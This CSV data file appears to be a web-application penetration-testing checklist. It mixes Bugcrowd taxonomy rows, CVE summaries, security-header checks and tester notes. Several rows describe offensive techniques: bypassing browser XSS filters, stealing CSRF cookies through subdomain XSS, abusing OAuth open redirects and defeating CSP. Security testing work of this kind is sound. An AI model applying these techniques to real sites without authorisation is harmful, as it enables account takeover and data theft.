BCVRT-161,BCVRT,Lack of Exploit Mitigations (P5),BugCrowd Vuln Rating Taxonomy v1.3,Lack of Binary Hardening; Lack of Exploit Mitigations,Lack of Exploit Mitigations (P5),,3,,,,161,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-156,BCVRT,Sensitive Application Data Stored Unencrypted: On External Storage (P4),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Storage; Sensitive Application Data Stored Unencrypted: On External Storage,Sensitive Application Data Stored Unencrypted: On External Storage (P4),,3,,,,156,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-163,BCVRT,Lack of Obfuscation (P5),BugCrowd Vuln Rating Taxonomy v1.3,Lack of Binary Hardening; Lack of Obfuscation,Lack of Obfuscation (P5),,3,,,,163,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-164,BCVRT,Runtime Instrumentation-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Lack of Binary Hardening; Runtime Instrumentation-Based,Runtime Instrumentation-Based (P5),,3,,,,164,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-162,BCVRT,Lack of Jailbreak Detection (P5),BugCrowd Vuln Rating Taxonomy v1.3,Lack of Binary Hardening; Lack of Jailbreak Detection,Lack of Jailbreak Detection (P5),,3,,,,162,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-158,BCVRT,Server-Side Credentials Storage: Plaintext (P4),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Storage; Server-Side Credentials Storage: Plaintext,Server-Side Credentials Storage: Plaintext (P4),,3,,,,158,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-256,,,
BCVRT-165,BCVRT,Cleartext Transmission of Sensitive Data,BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Transport; Cleartext Transmission of Sensitive Data,Cleartext Transmission of Sensitive Data,,2,,,,165,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-319,,,
BCVRT-169,BCVRT,Hardcoded Password: Privileged User (P1),BugCrowd Vuln Rating Taxonomy v1.3,Insecure OS/Firmware; Hardcoded Password: Privileged User,Hardcoded Password: Privileged User (P1),,2,,,,169,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-170,BCVRT,Hardcoded Password: Non-Privileged User (P2),BugCrowd Vuln Rating Taxonomy v1.3,Insecure OS/Firmware; Hardcoded Password: Non-Privileged User,Hardcoded Password: Non-Privileged User (P2),,2,,,,170,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-171,BCVRT,Cryptographic Flaw: Incorrect Usage (P1),BugCrowd Vuln Rating Taxonomy v1.3,Broken Cryptography; Cryptographic Flaw: Incorrect Usage,Cryptographic Flaw: Incorrect Usage (P1),,2,,,,171,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-172,BCVRT,Unnecessary Data Collection: WiFi SSID+Password (P4),BugCrowd Vuln Rating Taxonomy v1.3,Privacy Concerns; Unnecessary Data Collection: WiFi SSID+Password,Unnecessary Data Collection: WiFi SSID+Password (P4),,3,,,,172,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-173,BCVRT,Telnet Enabled: Credentials Required (P4),BugCrowd Vuln Rating Taxonomy v1.3,Network Security Misconfiguration; Telnet Enabled: Credentials Required,Telnet Enabled: Credentials Required (P4),,3,,,,173,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-174,BCVRT,SSL Certificate Pinning: Absent (P5),BugCrowd Vuln Rating Taxonomy v1.3,Mobile Security Misconfiguration; SSL Certificate Pinning: Absent,SSL Certificate Pinning: Absent (P5),,3,,,,174,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-175,BCVRT,SSL Certificate Pinning: Defeatable (P5),BugCrowd Vuln Rating Taxonomy v1.3,Mobile Security Misconfiguration; SSL Certificate Pinning: Defeatable,SSL Certificate Pinning: Defeatable (P5),,3,,,,175,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-176,BCVRT,Tapjacking (P5),BugCrowd Vuln Rating Taxonomy v1.3,Mobile Security Misconfiguration; Tapjacking,Tapjacking (P5),,3,,,,176,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-177,BCVRT,Binary Planting: Privilege Escalation (P4),BugCrowd Vuln Rating Taxonomy v1.3,Client-Side Injection; Binary Planting: Privilege Escalation,Binary Planting: Privilege Escalation (P4),,3,,,,177,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-269,,,
BCVRT-178,BCVRT,Binary Planting: No Privilege Escalation (P5),BugCrowd Vuln Rating Taxonomy v1.3,Client-Side Injection; Binary Planting: No Privilege Escalation,Binary Planting: No Privilege Escalation (P5),,3,,,,178,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
EXT-20160108T064524,Extras,XSS Auditor Bypass,SSL Vulnerability Test,,Single Sign-On analysis,,0,"XSS detection is heuristic based. When the server transform the reflected content XSS Auditor (mostly Google Chrome) that looks for exact match can be tricked. This happens when :
- incorrect encoding is applied
- custom transformation are applied
Tips : Place the transformed  content at the beginning of the script in a string value.

Browser specific approach:
XSS browser protections have to minimize false positive, otherwise it gets annoying to users and they disable it and websites disable it to prevent their website from having issues. Browsers have some rule that will whitelist reflected content on specific conditions.

Google Chrome:
Resources hosted on the same domain are never detected or blocked: 
- Can load user content as script.
- X-Content-Type-Options header must be not set.
- Can load powerful library (ex.: angular.js) used elsewhere in the site.
- Can load JavaScript with DOM based reflected content.
The only restriction is that the URL must not contain any GET parameter.

Internet Explorer:
IE never perform XSS detection from resources where ""Referer"" == domain of the requested URL
-- JavaScript based redirect
-- Clickable URL from user content
-- <iframe> URL that you can control
-- ""Referer"" spoofing vulnerability (fixed). ref.: http://www.brokenbrowser.com/referer-spoofing-defeating-xss-filter/

Test Site: http://xss.zhack.ca/hackfest/",Extras,,,The app is making use of an SSO mechanism that might be exploitable. To verify...,,false,https://msdn.microsoft.com/en-us/library/cc709423(v=vs.85).aspx,,http://slides.com/olivierarteau/xss-auditor-bypass,592,,,
EXT-20160113T053148,Extras,Log Jam - CVE-2015-4000,SSL Vulnerability,,LOGJAM - CVE-2015-4000,SSL,2,"The TLS protocol 1.2 and earlier, when a DHE_EXPORT ciphersuite is enabled on a server but not on a client, does not properly convey a DHE_EXPORT choice, which allows man-in-the-middle attackers to conduct cipher-downgrade attacks by rewriting a ClientHello with DHE replaced by DHE_EXPORT and then rewriting a ServerHello with DHE_EXPORT replaced by DHE.",Extras,,,,,false,https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-4000,https://weakdh.org/,https://weakdh.org/sysadmin.html,310,,,
EXT-20160113T053847,Extras,WinShock - CVE-2014-6321 - MS14-066,,,WinShock - CVE-2014-6321 - MS14-066,Windows,1,Schannel in Microsoft Windows Server allows remote attackers to execute arbitrary code via crafted packets.,Extras,,,,,false,https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321,,http://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/,310,,,
EXT-20160113T054029,Extras,ShellShock (BashBug) - CVE-2014-6271,Specific bug,,ShellShock (BashBug) - CVE-2014-6271,,2,"GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution.",Extras,,,,,,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271,,http://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec,0,,,
EXT-20160113T054537,Extras,Poodle - CVE-2014-3566,,,Poodle - CVE-2014-3566,,,"Padding Oracle On Downgraded Legacy Encryption (POODLE). The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle attackers to obtain cleartext data via a padding-oracle attack.",Extras,,,,,,http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566,https://www.ssllabs.com/,https://www.openssl.org/~bodo/ssl-poodle.pdf,310,,,
EXT-20160113T054807,Extras,Heartbleed - CVE-2014-0160,,,Heartbleed - CVE-2014-0160,,3,"The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c.",Extras,,,,,false,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160,http://heartbleed.com/,https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb,310,,,
EXT-20160116T203037,Extras,SQL Injection with sqlmap,SQL Injection,,SQL Injection,SQL Injection,3,Use sqlmap,Extras,,,,,false,,,mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=53,89,false,false,true
EXT-20160129T222102,Extras,Heap-based buffer overflow (CVE-2015-0235),,,eap-based buffer overflow in the __nss_hostname_digits_dots,,,"Heap-based buffer overflow in the __nss_hostname_digits_dots function in glibc 2.2, and other 2.x versions before 2.18, allows context-dependent attackers to execute arbitrary code via vectors related to the (1) gethostbyname or (2) gethostbyname2 fun...",Extras,,,,,false,http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235,,,119,,,
BCVRT-166,BCVRT,Executable Download: No Secure Integrity Check (P4),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Transport; Executable Download: No Secure Integrity Check,Executable Download: No Secure Integrity Check (P4),,3,,,,166,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-353,,,
BCVRT-167,BCVRT,Executable Download: Secure Integrity Check (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Transport; Executable Download: Secure Integrity Check,Executable Download: Secure Integrity Check (P5),,3,,,,167,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-168,BCVRT,Command Injection (P1),BugCrowd Vuln Rating Taxonomy v1.3,Insecure OS/Firmware; Command Injection,Command Injection (P1),,2,,,,168,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-77,,,
EXT-20160129T234938,Extras,Absolute path traversal vulnerability in Font.php (CVE-2015-7683),,,,,,"Absolute path traversal vulnerability in Font.php in the Font plugin before 7.5.1 for WordPress allows remote administrators to read arbitrary files via a full pathname in the url parameter to AjaxProxy.php.	4	
Medium	font_project:font:7.5::~~~wordpress~~	SINGLE_INSTANCE	
LOW	PARTIAL	NONE	NONE	NETWORK	CWE-22	CONFIRM:https://wordpress.org/plugins/font/changelog/ MISC:https://wpvulndb.com/vulnerabilities/8214 BUGTRAQ:20151012 CVE-2015-7683: Absolute Path Traversal in the Font WordPress Plugin MISC:http://packetstormsecurity.com/files/133930/WordPress-Font-7.5-Path-Traversal.html",Extras,,,,,false,http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7683,,,22,,,
EXT-20160226T201633,Extras,Report informational findings,Provide useful information to the app owner that isn't a real security issue (functional or non-functional),,Useful information,Useful information,0,Add details in the issues notes.,Extras,,,,,true,,,http://localhost,546,false,false,false
EXT-20160227T001858,Extras,Unsafe implementation,Report issues with an unsafe implementation that may lead to errors or insecure processing,,Testing the app in PT may result in directing test chat messages to PR,Unsafe implementation,2,,Extras,,,,,,,,N/A,474,,,false
EXT-20160227T161734,Extras,SSL Testing,Use online SSL Testing tool,,SSL Test Results,Transport encryption,0,Point the Qualys SSLTest service to the test target,Extras,,,Include SSL test results.,,true,https://www.ssllabs.com/ssltest,,https://www.ssllabs.com/ssltest/index.html,0,true,false,false
EXT-20160228T193514,Extras,Various Notes,Take various notes during testing,,Various Notes,,0,,Extras,,,,,,,,N/A,16,,,
EXT-20160302T081042,Extras,Password reuse,,,Password reuse (QA and PR),,1,Check that account credentials on one system aren't the same as on another system (e.g. QA vs Prod).,Extras,,,,,true,,,,521,,,
EXT-20160414T170737,Extras,TODO Tests,,,TODO Tests,,0,"Capture in the Notes section a list of TODO tests

Examples:
CWE-285 Improper Access Control (Authorization)
CWE-306 Missing Authentication for Critical Function
CWE-311 Missing Encryption of Sensitive Data [A06]
CWE-352 Cross-Site Request Forgery (CSRF) [A08]
CWE-434 Unrestricted Upload of File with Dangerous Type
CWE-798 Use of Hard-coded Credentials  
CWE-840 Business Logic Errors

Top 10 (2013)
A02 Broken Authentication and Session  Management
A04 Insecure Direct Object References 
A05 Security Misconfiguration
A06 Sensitive Data Exposure
A08 Cross-Site Request Forgery (CSRF)
A10 Unvalidated Redirects and Forwards

Those that are less applicable (everywhere) or testable via black-box methods:
CWE-494 Download of Code Without Integrity Check
CWE-732 Incorrect Permission Assignment for Critical Resource
CWE-754 Improper Check for Unusual or Exceptional Conditions
CWE-770 Allocation of Resources Without Limits or Throttling 
CWE-807 Reliance on Untrusted Inputs in a Security Decision",Extras,,,See notes for tests to perform later.,,true,,,,0,,,
EXT-20160415T001516,Extras,Manual tests to perform (hard to automate),,,Manual tests that are hard to automate,,0,"Vulnerabilities that scanners don't find reliably, that warrant a manual test
CWE-285 Improper Access Control (Authorization)
CWE-306 Missing Authentication for Critical Function
CWE-311 Missing Encryption of Sensitive Data [A06]
CWE-352 Cross-Site Request Forgery (CSRF) [A08]
CWE-434 Unrestricted Upload of File with Dangerous Type
CWE-798 Use of Hard-coded Credentials  

Top 10 (2013)
A02 Broken Authentication and Session  Management
A04 Insecure Direct Object References 
A05 Security Misconfiguration
A06 Sensitive Data Exposure
A08 Cross-Site Request Forgery (CSRF)
A10 Unvalidated Redirects and Forwards

Those that are less applicable (everywhere) or testable via black-box methods:
CWE-494 Download of Code Without Integrity Check
CWE-732 Incorrect Permission Assignment for Critical Resource
CWE-754 Improper Check for Unusual or Exceptional Conditions
CWE-770 Allocation of Resources Without Limits or Throttling 
CWE-807 Reliance on Untrusted Inputs in a Security Decision
[...]

Of course, this is just a generic list. We still need to adapt our approach based on context, validate findings from scanners (identify false positives, adjust severity/priority based on exposure), try to exploit new vulns, try new techniques, etc.",Extras,,,,,true,,,,0,,,
EXT-20160415T002959,Extras,Attack ideas,,,Attack ideas (vulnerabilities to validate),,0,Note future attack ideas in the Notes section,Extras,,,,,true,,,,,,,
EXT-20160415T010824,Extras,Exploit 1,,,XSS Exploit,,3,,Extras,,,,,,,,,931,,,
EXT-20160415T012144,Extras,XSS fuzz strings,,,,,3,"Try the list of 100 fuzz strings in the Test Ref.
Ref.: http://slides.com/mscasharjaved/cross-site-scripting-my-love#/
Source: http://pastebin.com/u6FY1xDA
",Extras,,,,,false,,,/txt/xss100.txt,80,false,true,
EXT-20160920T182257,Extras,Check X-Frame-Options header (clickjacking protection),,,X-Frame-Options header not used to protect against clickjacking,,1,"Verify that a suitable X-FRAME-OPTIONS header is in use for sites where content should not be viewed in a 3rd-party X-Frame.

Examples:
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://example.com/",Extras,,,,,false,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Frame-Options,https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,
EXT-20160920T182420,Extras,Check X-Content-Type-Options header,,,Missing X-Content-Type-Options header to mitigate against MIME-sniffing,,2,"Verify that all API responses contain X-Content-Type-Options: nosniff and Content-Disposition: attachment; filename=""api.json"" (or other appropriate filename for the content type).",Extras,,,,,true,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Content-Type-Options,https://www.veracode.com/blog/2014/03/guidelines-for-setting-security-headers,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,827,,,
EXT-20160920T182615,Extras,Check Content-Security-Policy header,,,No Content-Security-Policy header,,0,"Verify that a content security policy (CSPv2) is in place that helps mitigate common DOM, XSS, JSON, and JavaScript injection vulnerabilities. ",Extras,,,,,true,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Content-Security-Policy,,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,
EXT-20160920T182709,Extras,Check X-XSS-Protection header,,,Missing X-XSS-Protection header to mitigate against XSS,,2,"Verify that the X-XSS-Protection: 1; mode=block header is in place to enable browser reflected XSS filters.

Valid Settings
0 - Disables the XSS Protections offered by the user-agent.
1 - Enables the XSS Protections
1; mode=block - Enables XSS protections and instructs the user-agent to block the response in the event that script has been inserted from user input, instead of sanitizing.
1; report=http://site.com/report - A Chrome and WebKit only directive that tells the user-agent to report potential XSS attacks to a single URL. Data will be POST'd to the report URL in JSON format.

\Common Invalid Settings
0; mode=block; - A common misconfiguration where the 0 value will disable protections even though the mode=block is defined. It should be noted that Chrome has been enhanced to fail closed and treat this as an invalid setting but still keep default XSS protections in place.
1 mode=block; - All directives must be separated by a ;. Spaces and , are invalid separators. However, IE and Chrome will default to sanitizing the XSS in this case but not enable blocking mode as everything after the 1 is considered invalid.",Extras,,,,,true,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-XSS-Protection,https://www.veracode.com/blog/2014/03/guidelines-for-setting-security-headers,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,931,,,
EXT-20160920T184817,Extras,Check Strict-Transport-Security (HSTS) header,,,Missing encryption enforcement,,1,"HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. It allows web servers to declare that web browsers (or other complying user agents) should only interact with it using secure HTTPS connections, and never via the insecure HTTP protocol. HSTS is an IETF standards track protocol and is specified in RFC 6797. A server implements an HSTS policy by supplying a header (Strict-Transport-Security) over an HTTPS connection (HSTS headers over HTTP are ignored).",Extras,,,,,true,https://tools.ietf.org/html/rfc6797,https://www.owasp.org/index.php/HTTP_Strict_Transport_Security,https://www.owasp.org/index.php/Test_HTTP_Strict_Transport_Security_(OTG-CONFIG-007),818,,,
EXT-20160920T184943,Extras,Check Public-Key-Pins (HPKP) header,,,HTTP Public Key Pinning not implemented,,0,"HTTP Public Key Pinning (HPKP) is a security mechanism which allows HTTPS websites to resist impersonation by attackers using mis-issued or otherwise fraudulent certificates. (For example, sometimes attackers can compromise certificate authorities, and then can mis-issue certificates for a web origin.).

The HTTPS web server serves a list of public key hashes, and on subsequent connections clients expect that server to use one or more of those public keys in its certificate chain. Deploying HPKP safely will require operational and organizational maturity due to the risk that hosts may make themselves unavailable by pinning to a set of public key hashes that becomes invalid. With care, host operators can greatly reduce the risk of man-in-the-middle (MITM) attacks and other false authentication problems for their users without incurring undue risk.",Extras,,,,,false,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Public_Key_Pinning_Extension_for_HTTP_.28HPKP.29,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Public_Key_Pinning_Extension_for_HTTP_.28HPKP.29,,,,
EXT-20160920T185306,Extras,Check X-Permitted-Cross-Domain-Policies header,,,X-Permitted-Cross-Domain-Policies header,,2,"A cross-domain policy file is an XML document that grants a web client, such as Adobe Flash Player or Adobe Acrobat (though not necessarily limited to these), permission to handle data across domains. When clients request content hosted on a particular source domain and that content make requests directed towards a domain other than its own, the remote domain needs to host a cross-domain policy file that grants access to the source domain, allowing the client to continue the transaction. Normally a meta-policy is declared in the master policy file, but for those who can’t write to the root directory, they can also declare a meta-policy using the X-Permitted-Cross-Domain-Policies HTTP response header.",Extras,,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Permitted-Cross-Domain-Policies,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Permitted-Cross-Domain-Policies,,,,
EXT-20161005T133806,Extras,Outdated component,,,Component with known high-severity vulnerabilities,,1,Report findings about old components here (as one issue).,Extras,,,,,true,https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities,,,937,true,true,
EXT-20161011T113058,Extras,Burp scanner issue,,,Review Burp scanner issues,,0,"- In Burp, load the Clipboarder extension. 
- Use ""Copy as free text to clipboard"" from an issue in the Target tab
- Paste the clipboard to the issue field",Extras,,,,,true,,,,0,,,
EXT-20161017T150036,Extras,Check security headers,,,Some HTTP headers that could improve security are not being used,,2,"Check that important/useful HTTP security headers are used to prevent common security issues. Examples below.

Issue  : Clickjacking 
Header: X-Frame-Options or Content-Security-Policy

Issue   : Content sniffing, MIME-sniffing 
Header: X-Content-Type-Options, Content-Security-Policy

Issue  : XSS
Header: X-XSS-Protection, Content-Security-Policy

Issue : Protocol downgrade attacks, Cookie hijacking
Header: HTTP Strict Transport Security (HSTS)


",Extras,,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers,,,16,,,
EXT-20161017T155650,Extras,Vulns detected by app scanner,,,App scan results to review,,0,Copy list of vulns detected by app scanner and specify that these won't be reported here.,Extras,,,,,,,,,,,,
EXT-20161017T170627,Extras,CVE List,,,Possible server vulnerabilities (to verify),,0,Capture list of applicable CVEs,Extras,,,,,true,,,http://www.cvedetails.com/,937,,,
EXT-20160302T080433,Extras,Vulnerable web server software,,,Outdated/vulnerable web server software,,2,,Extras,,,"The following CVSS v3 scores correspond to a Risk Rating as follows:
- Score:=[0.1-3.9], Risk=Low
- Score:=[4.0-6.9], Risk=Medium
- Score:=[7.0-8.9], Risk=High
- Score:=[9.0-10.0], Risk=Critical",,true,,,,1026,true,,
EXT-20160302T080523,Extras,Mixed content sent to web browser,,,Mixed content sent to web browser,,2,"Check for browser warnings related to mixed HTTP and HTTPS content.

Websites that serve a web page using transport layer protection (HTTPS), but then also include additional content on the page such as JavaScript or images over HTTP are using mixed content and are vulnerable to attack. An attacker could replace the legitimate JavaScript being sent to the browser with a malicious version and have it execute in the context of the HTTPS page[7][8]. All content on a secure page must be served via HTTPS, including the HTML, JavaScript, images, CSS, XHR, and any other content.

A similar attack may be used to force a browser into sending a cookie normally transmitted over HTTPS to the HTTP version of the site, exposing the cookie. Cookies should be set with the ""secure"" flag (and if possible, the ""HTTPOnly"" flag) to prevent the cookie from being leaked[9].",Extras,,,,,true,https://www.ssllabs.com/projects/best-practices/,http://ferruh.mavituna.com/ssl-implementation-security-faq-oku/,,818,,,
EXT-20160302T081020,Extras,Incomplete functionality,,,Incomplete functionality,,1,Take note of incomplete functionality,Extras,,,,,,,,,912,,,
EXT-20161020T200019,Extras,Review browser errors,,,Browser errors,,1,Review errors in browser and report the ones that are important to the developers/integrators.,Extras,,,Browser errors could provide useful information for attackers and could prevent proper operation of the application. It is not impossible that QA staff may have forgotten to report browser errors so security analysts should also report them if they feel they need to be resolved.,,,"https://www.owasp.org/index.php/Error_Handling,_Auditing_and_Logging",,"https://www.owasp.org/index.php/Error_Handling,_Auditing_and_Logging",388,,,
EXT-20161021T184658,Extras,Exploiting CORS,,,Overly Permissive CORS policy,,2,See Burp Forum & AppSec Talk in Test Ref.,Extras,,,"An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.

If another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially retrieve content from the application, and sometimes carry out actions within the security context of the logged in user.

Even if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by an attacker to exploit the trust relationship and attack the application that allows access. CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.",,true,https://www.w3.org/TR/cors/,https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS,http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html,183,,,
EXT-20161024T124128,Extras,Web Hacking 101 Pro Tips & bounty hunting,,,Server misconfiguration,,2,"Notes from interviews held by Peter Yaworski (author of Web Hacking 101):

Tips from Arness Winnen @arneswinnen:
- Check scope. If wildcards in domains are allowed, look for subdomains. Look for session cookies scoped to the TLD (shared cookie, greater impact on TLD issues).
- Look for session cookies and CSRF tokens in cookies. If you find XSS (in subdomain), steal the CSRF cookie from TLD (greater payout).
- Check cross-domain.xml at root. Estimate the impact of a vuln on a subdomain (or not) (by using Flash)

Tips from @FileDescriptor
- 

Tips from Frans Rosén @fransrosen
- Search for framework debugging turned on. E.g. Flask debug mode. Search online in Shodan.
- Abuse IDs (direct object ref.)
- Abuse open redirect in OAuth2 (with URL that has the token)
- CSP bypass - i.e. make XSS work even if CSP should block it (e.g. sourcing an old version of AngularJS)

See also:
- https://www.torontowebsitedeveloper.com/drupal-video-tutorials
- https://www.arneswinnen.net/category/research/publications/
- https://www.torontowebsitedeveloper.com/
- http://feeds.soundcloud.com/users/soundcloud:users:217591392/sounds.rss
- https://www.youtube.com/watch?v=KDo68Laayh8 (Frans Rosen)

",Extras,,,,,,,,https://leanpub.com/web-hacking-101,933,,,
EXT-20161101T203017,Extras,Analysis of authentication flow,,,Information Exposure Through Query Strings in GET Request (CWE-598),,2,Analyze the authentication mechanism. Capture details here.,Extras,,,"The web application uses the GET method to process requests that contain sensitive information, which can expose that information through the browser's history, Referers, web logs, and other sources.",,,,,,598,,,
EXT-20161103T132859,Extras,Test data to use,,,Test data to use,,0,Capture good test data to use.,Extras,,,,,,,,,,,,
EXT-20171219T044642,Extras,TTestName,,,No CWE found,,1,TTesterSupport,Extras,,,No CWE was found to represent this issue/finding.,N/A,,,,TTRef,10,,,
EXT-20171219T045330,Extras,Run dependency check for NodeJS,,,Run dependency check for NodeJS,,0,"On Macbook Air: /Users/eric/Downloads/dependency-check/bin/check-waptrun.sh
",Extras,,,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.,,,https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities,,https://www.owasp.org/index.php/OWASP_Dependency_Check,937,,,
EXT-20180113T193027,Extras,TODO Dev,,,Features to implement,,0,Note functionality to fix or implement,Extras,,,The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program.,,,,,,20,,,
EXT-20180115T043949,Extras,Run snyk static analyzer,,,Use static code analyzer to find components with known vulnerabilities,,0,Run snyk by pointing it to the github repo.,Extras,,,,,,,,https://snyk.io/test,937,,,
EXT-20180313T031606,Extras,Source Code Disclosure,,,Source Code Disclosure,,2,,Extras,,,"Source code intended to be kept server-side can sometimes end up being disclosed to users. Such code may contain sensitive information such as database passwords and secret keys, which may help malicious users formulate attacks against the application.","Server-side source code is normally disclosed to clients as a result of typographical errors in scripts or because of misconfiguration, such as failing to grant executable permissions to a script or directory. Review the cause of the code disclosure and prevent it from happening.",,,,,18,,,
EXT-20180313T184839,Extras,Vulnerable version of jquery,,,Vulnerable version of jquery,,2,Just import this from Burp results (Retire.js extension),Extras,,,Vulnerable version of the library 'jquery' found.,,,http://research.insecurelabs.org/jquery/test/,,,937,,true,
EXT-20180313T185717,Extras,Vulnerable version of bootstrap,,,Vulnerable version of bootstrap,,1,,Extras,,,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.,,,,,,937,,true,
EXT-20180315T133152,Extras,Session hijacking (session fixation exploit),,,Authentication bypass (session fixation exploit),,3,,Extras,,,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.",,,,,,384,,,
EXT-20180328T175642,Extras,Apparent gaps in code/config versioning or release management,,,Code versioning and/or release management issues,,0,"Look for traces of insufficient code or configuration version management (online backup files/packages, lots of commented code...). This would be indicating some gaps in release management and/or an offline backup strategy.",Extras,,,"Proliferation of backup files and commented code. The security tester found traces of insufficient code or configuration version management (online backup files/packages, lots of commented code...). This normally indicates that there are some gaps in release management (process, tools, training). This gap promotes the proliferation/multiplication of project artifacts that increase the attack surface when left behind (and kept available for unauthorized users).","Implement a standard issue tracker, code versioning and configuration versioning system (e.g. multiple projects/releasees in JIRA and GIT). Make sure that they're managed to be in line with the release management process you have in place. Also make sure that your release management process supports parallel projects (branching/merging/tagging...), code reuse while avoiding mass copy-pasting, consistent use via build standards, etc.",,,,,530,,,
